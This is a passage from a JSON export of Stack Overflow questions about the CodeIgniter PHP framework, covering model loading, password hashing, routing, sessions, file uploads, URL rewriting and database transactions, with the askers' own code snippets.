$this-&gt;load-&gt;model('login_model','login');\n } \n\n  public function main{\n     $arrUserInfo = $this-&gt;login-&gt;getUserInfo();\n  }\n}\n</code></pre>\n\n<p>If I use \"MX_Controller\" then I am getting below error\nFatal error: Cannot redeclare class CI in <strong>E:\\Projects\\mySite\\application\\third_party\\MX\\Base.php on line 55</strong></p>\n\n<p>So I have change with \"CI_Controller\" then I am getting below error</p>\n\n<p><strong>An Error Was Encountered</strong>\nUnable to locate the model you have specified: login_model</p>\n\n<p>I am not getting why modular MVC not working.. If anyone have an idea then please share it.\nthanks..</p>\n"},{"tags":["codeigniter","passwords","bcrypt","phpass"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":12087348,"title":"phpass not working","body":"<p>I'm hashing the passwords upon account creation, and that it working (with the password set to VARCHAR(60)) but when I try to do this:</p>\n\n<pre><code>    $query = $this-&gt;CI-&gt;db-&gt;query(\"SELECT * FROM users WHERE email = ?\", $email);\n\n    if ($query-&gt;num_rows() &gt; 0) {\n        $user_pass = $query-&gt;row()-&gt;password;\n\n        $hasher = new PasswordHash(PHPASS_HASH_STRENGTH, PHPASS_HASH_PORTABLE);\n\n        if ($hasher-&gt;CheckPassword($user_pass, $pass)) {\n            return true;\n        } else {\n            return false;\n        }\n    } else {\n        return false;\n    }\n</code></pre>\n\n<p>it always returns false. Any ideas as to why this might be? (the password I'm providing is correct)</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12628751,"title":"Codeigniter 2.1 - counting the array before get","body":"<p>I have this function:</p>\n\n<pre><code>   function gi_get_by($col,$id, $itd, $tbl, $limit = 10)\n        {    \n        $this-&gt;db-&gt;select('*');\n        $this-&gt;db-&gt;from('global_info');\n        $this-&gt;db-&gt;join($tbl, 'id_' . $tbl . ' = id_global_info');\n        $this-&gt;db-&gt;where('info_type_id', $itd);\n        if($col == 'date_created' || $col == 'tag') {$this-&gt;db-&gt;like($col, $id);}        \n        else {$this-&gt;db-&gt;where($col, $id);}\n        if($tbl == 'ad') :\n        $this-&gt;db-&gt;order_by('paid', 'desc');\n        endif;\n        $this-&gt;db-&gt;order_by('date_created', 'desc');  \n        $this-&gt;db-&gt;limit($limit, $this-&gt;uri-&gt;segment(2));\n        $q = $this-&gt;db-&gt;get();        \n        return $q = $q-&gt;result_array();   \n        }\n</code></pre>\n\n<p>What I need is to count number of results before limit and to use them later in controller. I have an idea to duplicate this function without <strong>$limit</strong> but then it will be duplicating the same function. Is there another way to do this or I have to go with duplication?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12629019,"title":"Adding additional parameters to mail() using CI email class","body":"<p>I'm trying to find a way to add additional parameters to an email using Codeigniters email class (with the mail() send method). There is no documentation or other information I can find. Do you folks know if there is a way within the framework?</p>\n\n<p>PHP native mail():</p>\n\n<pre><code>mail ( string $to , string $subject , string $message [, string $additional_headers \n       [, string $additional_parameters ]] );\n</code></pre>\n\n<p>Codeigniter:</p>\n\n<pre><code>$this-&gt;load-&gt;library('email');\n$this-&gt;email-&gt;from('your@example.com', 'Your Name');\n$this-&gt;email-&gt;to('someone@example.com');\n$this-&gt;email-&gt;subject('Email Test');\n$this-&gt;email-&gt;message('Testing the email class.');\n$this-&gt;email-&gt;additional_parameters('something_goes_here'); // this is what I need\n$this-&gt;email-&gt;send();\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12628676,"title":"Tutorial - Create news items. Getting 404 after submitting a new article","body":"<p>Getting to know <strong>Code Igniter</strong>, and was following this particular section of the tutorial:</p>\n\n<p><code>http://codeigniter.com/user_guide/tutorial/create_news_items.html</code></p>\n\n<p>Everything works until I click <em>\"Create news item\"</em>. I receive <strong>404</strong> page and my URL bar looks like this:</p>\n\n<p><code>http://localhost/tut/index.php/news/localhost/tut/index.php/news/create</code></p>\n\n<p>Thinking maybe it's route's fault:</p>\n\n<pre><code>$route['default_controller'] = \"news/index\";\n$route['404_override'] = '';\n$route['news/(:any)'] = 'news/view/$1';\n$route['news'] = 'news'; // what's this for?\n$route['news/create'] = 'news/create';\n</code></pre>\n\n<p>Also, my config.php:</p>\n\n<pre><code>$config['base_url'] = 'localhost/tut';\n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["php","session","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":2393932,"title":"Multi page redirect","body":"<p>I'm using CodeIgniter with CodeIgniter sessions that are stored in a MySQL database.</p>\n\n<p>I need to do a multi-page redirect as shown below:</p>\n\n<pre><code>`some_form.php` -&gt; `processing.php` -&gt; `another_form_based_on_processing.php`\n</code></pre>\n\n<p>Everything's okay going from <code>some_form.php</code> -> <code>processing.php</code>.</p>\n\n<p>But when I redirect the page from <code>processing.php</code> -> <code>another_form_based_on_processing.php</code>, I lose the session. An entirely new session is started, and user information and all other session variables are gone.</p>\n\n<p>What's the best way to approach this problem?</p>\n"},{"tags":["php","mysql","sql","codeigniter","injection"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12628347,"title":"mysql injection and cross site scripting - CodeIgniter","body":"<p>There is a site which was written in CI version 1.7.2.</p>\n\n<p>The task is to prevent injection attacks and cross site scripting.</p>\n\n<p>I pretty much read all kinds of information related to it. I tried</p>\n\n<p><code>-htmlentities</code></p>\n\n<p><code>-mysql_real_escape_string</code></p>\n\n<p><code>-CI xss_clean</code></p>\n\n<p><code>-pregmatch, escape, htmlspecialchars</code></p>\n\n<p><code>-CI escape</code></p>\n\n<p><code>-strip_tags</code></p>\n\n<p><code>-magic_quotes</code></p>\n\n<p>In the search box, if I type an alert code or writeResponse, it displays all sorts of results from the site and DB.(some don’t work in Chrome but the alerts and everything else works in Firefox and IE)</p>\n\n<p>Please suggest what would be the best way to deal with this.</p>\n\n<p>Thank You</p>\n"},{"tags":["php","javascript","html","codeigniter","google-chrome"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12628110,"title":"javascript are not working on Google chrome","body":"<p>On Codeigniter I have a code</p>\n\n<p>HTML</p>\n\n<pre><code>//ROOTPATH is the constant Path and $recordId is coming from a loop.\n\n&lt;a href=\"#\" onclick=\"windowRedirect('&lt;?php echo ROOTPATH; ?&gt;&amp;action=deleteRecord&amp;id=&lt;?php echo $recordId; ?&gt;','Are you sure you want to Delete');return false;\"&gt;Delete&lt;/a&gt;\n</code></pre>\n\n<p>Javascript</p>\n\n<pre><code>windowRedirect(url,msg)\n{\n  if(confirm(msg)) \n  { \n    window.location.href = url;\n  }\n  else\n  {\n   return false;\n  }\n}\n</code></pre>\n\n<p>I have written a simple javascript which will redirect url if user click on OK button but I am getting weird problem on Google chrome where this code is working perfectly on Mozila Firefox, IE 8/9 and Applae Safari. Can any one tell me how can I solve this Google Chrome Problem.</p>\n\n<p>Though I have a doubt this script is probably not working because of '#' on the href field but I am not sure.</p>\n"},{"tags":["php","codeigniter","routes"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12626700,"title":"Only allow URL's specified in routes to be seen in Codeigniter","body":"<p>If I have a controller called articles, which has a method called view_articles, a user can type in <a href=\"http://example.com/articles/view_articles/some-post\" rel=\"nofollow\">http://example.com/articles/view_articles/some-post</a> and have it return a page.</p>\n\n<p>I have specified a route to be <a href=\"http://example.com/article/post-name\" rel=\"nofollow\">http://example.com/article/post-name</a>. How can I make it so that only the URL specified in the route is visible? Is there a way for articles/view_articles/some-post to show a 404 instead of showing the same page as the route URL?</p>\n\n<p>I am trying to prevent duplication for SEO purposes.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12625831,"title":"Redirect user once function processed","body":"<p>I'm new to code igniter and I'm wondering how I can redirect a user back to the previous view and display a success or error message after they have submitted a form.</p>\n\n<p>Here is my view</p>\n\n<pre><code>&lt;div id=\"modal\"&gt;\n    &lt;?php echo form_open('additem/insert', array('id'=&gt;'insert')); ?&gt; \n    &lt;div class=\"field\"&gt;\n        &lt;label for=\"title\"&gt;Title:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"title\" value=\"&lt;?=(isset($_GET['title'])) ? $_GET['title'] : ''?&gt;\" /&gt;\n    &lt;/div&gt;\n    &lt;div class=\"field\"&gt;\n        &lt;label for=\"link\"&gt;Link:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"raw_link\" value=\"&lt;?=(isset($_GET['link'])) ? $_GET['link'] : ''?&gt;\" /&gt;\n    &lt;/div&gt;\n    &lt;div class=\"field\"&gt;\n        &lt;label for=\"title\"&gt;Additional Info: &lt;span class=\"tip\"&gt;(size or colour)&lt;/span&gt;&lt;/label&gt;\n        &lt;input type=\"text\" name=\"additional_info\" /&gt;\n        &lt;input type=\"hidden\" name=\"fb_user_id\" value=\"&lt;?=$_SESSION['data']['fb_user_id']?&gt;\" /&gt;\n    &lt;/div&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p></p>\n\n<p>Here is my controller</p>\n\n<pre><code>class Additem extends CI_Controller {\npublic function index() {\n\n    $this-&gt;load-&gt;helper('form');\n    $this-&gt;load-&gt;model('list_model');\n\n    $this-&gt;load-&gt;view('modal/add-item');\n}\n\npublic function insert() {\n\n    $data = array(\n        'id' =&gt; $this-&gt;input-&gt;post('id', TRUE),\n        'title' =&gt; $this-&gt;input-&gt;post('title', TRUE),\n        'raw_link' =&gt; $this-&gt;input-&gt;post('raw_link', TRUE),\n        'additional_info' =&gt; $this-&gt;input-&gt;post('additional_info', TRUE),\n        'fb_user_id' =&gt; $this-&gt;input-&gt;post('fb_user_id', TRUE)\n    );\n\n    $this-&gt;load-&gt;model('list_model');\n    $this-&gt;list_model-&gt;add_list_item($data);\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Here is model</p>\n\n<pre><code>function add_list_item($data) {\n\n    $this-&gt;load-&gt;database();\n\n    $this-&gt;db-&gt;trans_start();\n\n    $this-&gt;db-&gt;query(\"INSERT list_items (fb_user_id, added, title, raw_link, additional_info) VALUES(\".$this-&gt;db-&gt;escape($data['fb_user_id']).\", NOW(), \".$this-&gt;db-&gt;escape($data['title']).\", \".$this-&gt;db-&gt;escape($data['raw_link']).\", \".$this-&gt;db-&gt;escape($data['additional_info']).\")\");\n    $this-&gt;db-&gt;query(\"UPDATE users SET num_items = num_items +1 WHERE fb_user_id = \".$this-&gt;db-&gt;escape($data['fb_user_id']).\"\");\n\n    $this-&gt;db-&gt;trans_complete();\n\n    if ($this-&gt;db-&gt;trans_status() === FALSE) {\n       log_message('error', 'Unable to add list item for user '.$data['fb_user_id'].'');\n    }\n}\n</code></pre>\n\n<p>At the moment I am just presented with a blank screen with the url directing at the form location additem/insert, although everything works as should. I just want to redirect the user back to the previous view with a success or fail message.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12532481,"title":"codeigniter - upload image display error if image field is empty","body":"<p>I have this function in my controller. If I add an image, it works fine, but if I don't upload an image, I get the following error:</p>\n\n<p>Message: Undefined index: categoryphoto\nFilename: controllers/faqcategories.php\nLine number:90</p>\n\n<p>Here is my code</p>\n\n<pre><code> public function addNewFaqCategory() \n    {    \n        $currentUser = $this-&gt;isLoggedIn();\n        $this-&gt;load-&gt;library('upload');\n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;form_validation-&gt;set_rules('categoryname', 'Category Name', 'trim|required|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('categoryname_en', 'Category Name', '');\n        $this-&gt;form_validation-&gt;set_rules('visible', 'Visible', 'trim|required|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('sorder', 'Sort Order', 'trim|numeric|xss_clean');\n\n        if ($this-&gt;form_validation-&gt;run() == FALSE) \n        {\n            $this-&gt;displayAddFaqCategoryForm();\n        } else {\n\n            $insertWhat = array(\n                                'categoryname'    =&gt; $this-&gt;input-&gt;post('categoryname'),\n                                'categoryname_en' =&gt; $this-&gt;input-&gt;post('categoryname_en'),\n                                'parentid'        =&gt; $this-&gt;input-&gt;post('parentid'),\n                                'description'     =&gt; $this-&gt;input-&gt;post('description'),\n                                'description_en'  =&gt; $this-&gt;input-&gt;post('description_en'),\n                                'metatags'        =&gt; $this-&gt;input-&gt;post('metatags'),\n                                'metatags_en'     =&gt; $this-&gt;input-&gt;post('metatags_en'),\n                                'sorder'          =&gt; $this-&gt;input-&gt;post('sorder'),\n                                'visible'         =&gt; $this-&gt;input-&gt;post('visible'),\n                                'categoryphoto'   =&gt; ($_FILES['categoryphoto']['name']) // line 90, error is here....\n\n                               );\n\n            if($insertWhat['categoryphoto'] !=\"\")\n            {\n                $insertWhat['categoryphoto'] = str_replace(' ', '_',$insertWhat['categoryphoto']);\n                $now = date('Y-m-d-His');\n                $insertWhat['categoryphoto'] = $now.$insertWhat['categoryphoto'];\n        $config['upload_path'] = 'backOffice/backOfficeImages';\n        $config['allowed_types'] = 'gif|jpg|jpeg|bmp|png';\n        $config['max_size'] = '2048';\n        $config['max_width']  = '1024';\n        $config['max_height']  = '768';\n                $config['file_name'] = $insertWhat['categoryphoto'];\n                $this-&gt;load-&gt;library('upload', $config);\n                $this-&gt;upload-&gt;initialize($config);   \n            }\n            $this-&gt;upload-&gt;do_upload('categoryphoto');\n            $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data('categoryphoto'));\n            $this-&gt;load-&gt;model('faqcategoriesmodel');\n            $this-&gt;faqcategoriesmodel-&gt;save($insertWhat);\n            $this-&gt;displayAllFaqCategories();\n        }\n    } // end of function addNewFaqCategory\n</code></pre>\n\n<p>Line 90 = 'categoryphoto'   => ($_FILES['categoryphoto']['name'])</p>\n\n<p>Any help will be deeply appreciated.</p>\n\n<p>Zoran </p>\n"},{"tags":["php","html","css","security","codeigniter"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12623373,"title":"Apart from SQL injection what other security vulnerabilities should I be aware of in a website?","body":"<p>I generally work using the codeigniter framework, which provides some help with preventing sql injection, e.g. xss clean of form input data. </p>\n\n<p>I have a basic idea of what sql injection is and how to stop it happening, but a friend of mine has a very basic site in which the only user input was a cgi form to email script - parts of the site were replaced with some adult content.</p>\n\n<p>So I am curious how someone could have gained control of such a basic site and also, what kind of vulnerabilities I should be aware of when building my own sites?</p>\n"},{"tags":["php","codeigniter","google-chrome","caching","optimization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12620714,"title":"Make a Webpage Cacheable - Codeigniter Php Chrome Optimization","body":"<p>Im observing a very high load time on my webpage and so i decided to run this Audit on chrome to detect areas where i can improve the speed</p>\n\n<p>So chrome suggested that i </p>\n\n<blockquote>\n  <p>The following resources are explicitly non-cacheable. Consider making\n  them cacheable if possible:</p>\n</blockquote>\n\n<p>and there are 76 file listed below that are image files , CSS , and PHP files</p>\n\n<p>i want to know how do i make these file \"cacheable\"</p>\n\n<p>Two more suggestion that are included are :  </p>\n\n<ol>\n<li><blockquote>\n  <p>There are multiple resources served from same domain. Consider\n  combining them into as few files as possible.9 CSS resources served\n  from localhost.</p>\n</blockquote></li>\n<li><blockquote>\n  <p>There are multiple resources served from same domain. Consider\n  combining them into as few files as possible.16 JavaScript resources\n  served from localhost.</p>\n</blockquote></li>\n</ol>\n\n<p>I wanted to know how much these 2 ^ properties will help me increase the speed of loading the site.</p>\n\n<p>Please if possible do give me other options too , to make my website load faster apart from mentioned above.In dire need of help , the sites really slowed one and need to optimize the loading asap</p>\n\n<p>Thank you</p>\n"},{"tags":["mysql","codeigniter","transactions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12622757,"title":"codeigniter mysql transactions","body":"<p>I'm new to database transactions and what i've found is extremely confusing. I have a queue table that contains email address, send datetime, and sent datetime. My cron job is constantly firing and selecting rows with the 'send datetime' passed now. It sends an email to the address and updates the 'sent datetime' column.</p>\n\n<p>If this cron job fired at the exact same time, there is potential for the them to grab the same rows, thus sending the email twice. </p>\n\n<p>From what i understand, transactions all depend on the success or failure or queries. How do i check that in this scenario?</p>\n\n<pre><code>$this-&gt;db-&gt;trans_begin();\n\n$query = $this-&gt;db-&gt;query('SELECT * FROM Queue_table where send &gt;= now LIMIT 100');\n\nforeach ($query-&gt;result() as $row)\n{\n   //code to send email to $row-&gt;email;\n   $this-&gt;db-&gt;query('UPDATE Queue_table SET sent = now WHERE id = '$row-&gt;id'');\n}\n\n//the following doesn't make much sense to me. What would cause\n// this to be false in this scenario?\n\nif ($this-&gt;db-&gt;trans_status() === FALSE)\n{\n    $this-&gt;db-&gt;trans_rollback();\n}\nelse\n{\n    $this-&gt;db-&gt;trans_commit();\n}\n</code></pre>\n\n<p>Am i going about doing this completely wrong?</p>\n"},{"tags":["php","codeigniter","email","imap"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12595062,"title":"unique id in imap php","body":"<p>I am using <code>imap_search</code> to get a list of Emails FROM <code>INBOX</code> and <code>SENT ITEMS</code>.</p>\n\n<p>I have a grid that showing the Mail headers first ,when user clicks on one row i want to show entire content,like body,attachment etc ..</p>\n\n<p>to achieve this there should be a UNIQUE ID for each messages.</p>\n\n<p>how can i get UNIQUE ID for messages , i know about the <code>SE_UID</code> option will return the UNIQUE ID'S but UNIQUE ID are only in one Mail box ,</p>\n\n<p>I can see same ID'S on INBOX and SENT ITEMS.</p>\n\n<p>Please help me.</p>\n\n<p><strong>Note : I am using Codeigniter with Peeker Library.</strong></p>\n\n<p>Thanks.</p>\n"},{"tags":["php","codeigniter","mustache","dust.js"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12621926,"title":"Mustache.php or Dustjs with codeigniter","body":"<p>I am working on codeigniter project. I like to use frontend template Mustache. Is there any good codeigniter library for Mustache / Dustjs template.</p>\n\n<p>I was check this Mustache-Spark--> <a href=\"https://github.com/Cordazar/Mustache-Spark/\" rel=\"nofollow\">https://github.com/Cordazar/Mustache-Spark/</a> but still looking for better library for the same.</p>\n"},{"tags":["php","validation","codeigniter","form-validation","phone"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":599,"score":2,"question_id":10838804,"title":"Phone number validation in php codeigniter","body":"<p>I have used the call back function for phone no validation from this link : </p>\n\n<p><a href=\"http://stackoverflow.com/questions/1937376/codeigniter-form-validation-with-phone-numbers\">codeigniter form validation with phone numbers</a> </p>\n\n<p>the code is:\n<code></p>\n\n<pre><code>function valid_phone_number_or_empty($value)\n\n{\n    $value = trim($value);\n\n    if ($value == '') {\n\n            return TRUE;\n    }\n    else\n    {\n            if (preg_match('/^\\(?[0-9]{3}\\)?[-. ]?[0-9]{3}[-. ]?[0-9]{4}$/', $value))\n            {\n                    return preg_replace('/^\\(?([0-9]{3})\\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/', '($1) $2-$3', $value);\n            }\n            else\n            {\n                    return FALSE;\n            }\n    }\n}\n</code></pre>\n\n<p></code></p>\n\n<p>But now the problem is it doesn't accept phone-no from european countries and other parts of world which are 11 to 13 digits. Can anyone provide me with any other validation for thats universal for all countries.Thanks in advance.</p>\n"},{"tags":["php","codeigniter","mod-rewrite","url-rewriting","godaddy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12620991,"title":"Can't remove index.php with codeigniter on Godaddy","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5725358/problem-with-codeigniter-and-uri-on-godaddy-servers\">Problem with CodeIgniter and URI on GoDaddy servers</a>  </p>\n</blockquote>\n\n\n\n<p>(Using: Codeigniter 2.1.2)</p>\n\n<p>I am building a web application with code igniter and have been testing all the functionalities with my localhost. I figured out how to remove the 'index.php' from the URL link and it works fine within my localhost. But when I upload my codeigniter to godaddy, the URL Redirect doesn't work anymore. Below are the steps I have taken and the files I have at my localhost.</p>\n\n<p><strong>changing htaccess</strong> - I have put my .htaccess to the ci root folder and below is the mod_rewrite codes.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteCond $1 !^(index\\.php|images|robots\\.txt|css)\nRewriteRule ^(.*)$ ./index.php/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>changing config.php</strong> </p>\n\n<pre><code>$config['uri_protocol'] = 'REQUEST_URI';\n$config['index_page'] = '';\n</code></pre>\n\n<p>Please help. Thank you very much. :)</p>\n"},{"tags":["php","codeigniter","codeigniter-2","grocery-crud"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":207,"score":2,"question_id":12596304,"title":"CRUD for Codeigniter, grocerycrud or carbogrid?","body":"<p>I am using CodeIgniter for my website. I am currently trying to implement an admin section where I've to enable CRUD features.</p>\n\n<p>I searched online and came across two different extensions for CI.</p>\n\n<ol>\n<li>Grocerycrud <a href=\"http://www.grocerycrud.com\" rel=\"nofollow\">http://www.grocerycrud.com</a></li>\n<li>Carbogrid <a href=\"http://carbogrid.com\" rel=\"nofollow\">http://carbogrid.com</a></li>\n</ol>\n\n<p>Can anyone suggest which one is better ?</p>\n\n<p>Edit: I am using PostgreSQL database. </p>\n"},{"tags":["php","sqlite","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12620294,"title":"Working with sqlite and codeigniter","body":"<p>My goal is to create a sqlite database file that would be downloaded by iOS application later.</p>\n\n<p>My question is, how can i create a sqlite database file with CodeIgniter? What is the sqlite file's structure?</p>\n\n<p>Thank you very much!</p>\n"},{"tags":["php","codeigniter","web-hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1039,"score":0,"question_id":10648752,"title":"CodeIgniter : Unable to load the requested file:","body":"<p>Hi I’m just new in codeigniter. My website works locally, but when I uploaded it, I got this error:</p>\n\n<p>An Error Was Encountered\nUnable to load the requested file: home\\home_view.php</p>\n\n<p>Here is my controller:</p>\n\n<pre><code>&lt;?php\nclass home extends CI_Controller{\n\nfunction index(){\n\n  $data=array();\n  if($query=$this-&gt;home_model-&gt;get_dynamic_main_menu())\n  {\n  $data[‘main_menu’] = $query;\n  }\n\n  $this-&gt;load-&gt;view(‘home\\home_view’,$data);\n}\n\n\n}\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":40,"score":-2,"question_id":12569588,"title":"How to auto include to use own class with CodeIgniter","body":"<p>I am using CodeIgniter. I want to use my own class to pass as argument inside controller functions.</p>\n\n<p>Normally, i can put this class in a folder and include it to MY_Controller with its path. But i want to learn if there is a way to do this in CodeIgniter. I can't put it in libraries folder and can't use loader class because it tyries to create an instance of object, but i want to create instance whenever i want. Loader class gives error if my own class need constructor parameters.</p>\n\n<p>What is the best way to do that? Which is the best folder to put in it?</p>\n"},{"tags":["php",".htaccess","codeigniter","mod-rewrite","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12242774,"title":"Codeigniter Page Not Found , change in .htacess","body":"<p>I was working on my test live server ,  i made some changes in a file and saved it , suddenly the whole website crashed.</p>\n\n<p>When i now log to my test server(http://www.uplits.com/). It shows a Directory has no index file error and when i log into the codeigniter(http://uplits.com/skidt/admin919/codeigniter/)</p>\n\n<p>It shows a page not found error.</p>\n\n<p>Please help , i dont know what could have gone wrong.</p>\n\n<pre><code>RewriteEngine on \nRewriteCond $1 !^(index\\.php|resources|robots\\.txt) \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteRule ^(.*)$ index.php?$1 [L,QSA]\n</code></pre>\n"},{"tags":["codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12616399,"title":"codeigniter can't load $db active record in one controller but yes in another controller","body":"<p>I have a Message controller that use Message_model to use the database by active record.<br>\nEverything is OK.  </p>\n\n<p>Message_model code</p>\n\n<pre><code>function send_message($data) {\n        $this-&gt;db-&gt;insert($this-&gt;table_name, $data);\n        $num = $this-&gt;db-&gt;affected_rows();\n        return $this-&gt;db-&gt;insert_id();\n}\n</code></pre>\n\n<p>But in another controller(User controller) that use the Message_model.<br>\nIt give me</p>\n\n<pre><code>&lt;h4&gt;A PHP Error was encountered&lt;/h4&gt;\n\n&lt;p&gt;Severity: Notice&lt;/p&gt;\n&lt;p&gt;Message:  Undefined property: Maxdoodle::$db&lt;/p&gt;\n&lt;p&gt;Filename: core/Model.php&lt;/p&gt;\n&lt;p&gt;Line Number: 51&lt;/p&gt;\n</code></pre>\n\n<p>I've setup the default active record in database.php<br>\nBecause I can use it in Message controller as mention before.  </p>\n\n<p>CodeIgniter version:2.1.1</p>\n"},{"tags":["php","codeigniter","google-chrome"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":439,"score":3,"question_id":9331501,"title":"Mime type of zip file in google chrome","body":"<p>I have an application developed in CodeIgniter, and I have a very weird issue.  A zip file is correctly uploaded while using Firefox or IE, but in Google Chrome, it gives me an error.</p>\n\n<p>I have checked in CodeIgniter's mimes files and they have support for\n<code>application/x-zip</code>, <code>application/zip</code>, and <code>application/x-zip-compressed</code> mime types.</p>\n\n<p>Which mime types should I add in my code to make it work in all the browsers including Google Chrome?</p>\n"},{"tags":["codeigniter","file-upload","codeigniter-2","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12615489,"title":"I cant upload Multiple file upload in codeignitor","body":"<p>This is my view (html) content</p>\n\n<pre><code>&lt;tr&gt;\n    &lt;td width=\"341\" class=\"linkssubhead\"&gt;\n        Subcategory Image&amp;nbsp;&lt;span class=\"errormsg\"&gt;*&lt;/span&gt;\n    &lt;/td&gt;\n    &lt;td width=\"965\" align=\"left\"&gt;\n        &lt;input type=\"file\" name=\"subcategory_image\" value=\"\"  class=\"required\" /&gt;&amp;nbsp;&amp;nbsp;&lt;span class=\"errormsg\"&gt;&lt;?php  echo $file_error ; ?&gt; &lt;/span&gt;\n    &lt;/td&gt;       \n&lt;/tr&gt;\n&lt;tr&gt;\n    &lt;td width=\"341\" class=\"linkssubhead\"&gt;\n        Subcategory Banner Image&amp;nbsp;&lt;span class=\"errormsg\"&gt;*&lt;/span&gt;\n    &lt;/td&gt;\n    &lt;td width=\"965\" align=\"left\"&gt;\n        &lt;input type=\"file\" name=\"subcategory_banner_image\" value=\"\"  class=\"required\" /&gt;&amp;nbsp;&amp;nbsp;&lt;span class=\"errormsg\"&gt;&lt;?php  echo $file_error ; ?&gt; &lt;/span&gt;\n    &lt;/td&gt;       \n&lt;/tr&gt;\n&lt;tr&gt;\n    &lt;td width=\"341\" class=\"linkssubhead\"&gt;\n        Subcategory Banner Logo&amp;nbsp;&lt;span class=\"errormsg\"&gt;*&lt;/span&gt;\n    &lt;/td&gt;\n    &lt;td width=\"965\" align=\"left\"&gt;\n        &lt;input type=\"file\" name=\"subcategory_banner_logo\" value=\"\"  class=\"required\" /&gt;&amp;nbsp;&amp;nbsp;&lt;span class=\"errormsg\"&gt;&lt;?php  echo $file_error ; ?&gt; &lt;/span&gt;\n    &lt;/td&gt;       \n&lt;/tr&gt;\n</code></pre>\n\n<p>This is my controller</p>\n\n<pre><code>$config_image['allowed_types'] =  'gif|jpg|png';\n$config_image['overwrite'] =TRUE;\n$config_image['subcategory_image']['upload_path'] = './public/subcategory/';\n$config_image['subcategory_banner_image']['upload_path'] = './public/subcategory/bannerimage/';\n$config_image['subcategory_banner_logo']['upload_path'] = './public/subcategory/bannerlogo/';\n$config_image['subcategory_image']['file_name'] = $this-&gt;input-&gt;post('subcategory_name');\n$config_image['subcategory_banner_image']['file_name'] = 'banner_image_'.$this-&gt;input-&gt;post('subcategory_name');\n$config_image['subcategory_banner_logo']['file_name'] =  'banner_logo_'.$this-&gt;input-&gt;post('subcategory_name');\n\n$this-&gt;load-&gt;library('upload', $config_image);\n$this-&gt;upload-&gt;initialize($config_image); \nif (!$this-&gt;upload-&gt;do_upload(array('subcategory_image','subcategory_banner_image','subcategory_banner_logo')))\n{\n    $errors = $this-&gt;upload-&gt;display_errors();\n    if ($errors)\n    {\n        $data['file_error'] = $errors;\n        $data['body'] =  $this-&gt;load-&gt;view('matress_model/add_subcategory',$data,TRUE);\n        $this-&gt;load-&gt;view('page',$data);\n    } \n}\nelse\n{\n    redirect('fileupload/sucess');\n}\n</code></pre>\n\n<p>After submitting the form I got an error</p>\n\n<pre><code>Severity: Warning\nMessage: Illegal offset type in isset or empty\nFilename: libraries/Upload.php\nLine Number: 140\n</code></pre>\n\n<p>How do I get rid of this and how can I allow multiple files upload?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12617170,"title":"CodeIgniter gives 404 after 